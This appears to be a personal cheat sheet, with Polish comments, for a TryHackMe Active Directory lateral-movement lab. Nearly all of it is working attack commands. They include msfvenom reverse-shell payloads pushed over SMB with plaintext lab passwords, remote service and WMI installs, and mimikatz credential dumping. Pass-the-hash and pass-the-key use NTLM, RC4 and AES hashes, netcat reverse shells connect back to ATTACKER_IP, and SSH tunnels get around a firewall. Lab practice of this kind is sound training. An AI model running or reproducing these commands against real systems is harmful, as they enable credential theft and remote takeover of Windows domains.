# spawn process remotly
# atakujący
msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=10.50.65.176 LPORT=4444 -o myservice.exe
smbclient -c 'put myservice.exe' -U t1_leonard.summers -W ZA '//thmiis.za.tryhackme.com/admin$/' EZpass4ever
msfconsole -q -x "use exploit/multi/handler; set payload windows/shell/reverse_tcp; set LHOST lateralmovement; set LPORT 4444;exploit"
# PC1
runas /netonly /user:ZA.TRYHACKME.COM\t1_leonard.summers "c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4443"
# atakujący
nc -lvp 4443
# PC1 jako user
sc.exe \\thmiis.za.tryhackme.com create THMservice-3249 binPath= "%windir%\myservice.exe" start= auto
sc.exe \\thmiis.za.tryhackme.com start THMservice-3249

# WMI session
# atakujący
msfvenom -p windows/x64/shell_reverse_tcp LHOST=lateralmovement LPORT=4445 -f msi > myinstaller.msi
smbclient -c 'put myinstaller.msi' -U t1_corine.waters -W ZA '//thmiis.za.tryhackme.com/admin$/' Korine.1994
msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/shell/reverse_tcp; set LHOST lateralmovement; set LPORT 4445;exploit"
#pc1
$username = 't1_corine.waters';
$password = 'Korine.1994';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
$Opt = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName thmiis.za.tryhackme.com -Credential $credential -SessionOption $Opt -ErrorAction Stop
Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\myinstaller.msi"; Options = ""; AllUsers = $false}

# mimikatz pass-the-hash
privilege::debug
token::elevate
lsadump::sam
#lub 
sekurlsa::msv 
# potem włączyć nasłuchiwanie i się połączyć można użyć RDP
token::revert
sekurlsa::pth /user:bob.jenkins /domain:za.tryhackme.com /ntlm:6b4a57f67805a663c818106dc0648484 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5555"
# lub inne
xfreerdp /v:VICTIM_IP /u:DOMAIN\\MyUser /pth:NTLM_HASH
psexec.py -hashes NTLM_HASH DOMAIN/MyUser@VICTIM_IP
evil-winrm -i VICTIM_IP -u MyUser -H NTLM_HASH

#kerberos ass-the-Key
privilege::debug
sekurlsa::tickets /export
kerberos::ptt [0;427fcd5]-2-0-40e10000-Administrator@krbtgt-ZA.TRYHACKME.COM.kirbi
#dalej mimikatz
privilege::debug
sekurlsa::ekeys
#rc4 hash
sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /rc4:96ea24eff4dff1fbe13818fbf12ea7d8 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
# AES128
sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes128:b65ea8151f13a31d01377f5934bf3883 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
# AES256
sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes256:b54259bbff03af8d37a138c375e29254a2ca0649337cc4c73addcd696b4cdb65 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"

# port forwarding, ponieważ nie mamy dostępu do gui
useradd tunneluser -m -d /home/tunneluser -s /bin/true
passwd tunneluser
ssh tunneluser@1.1.1.1 -R 3389:3.3.3.3:3389 -N
#arakujący
xfreerdp /v:127.0.0.1 /u:MyUser /p:MyPassword
# by ominąć zaporę użyć tego
ssh tunneluser@1.1.1.1 -L *:80:127.0.0.1:80 -N
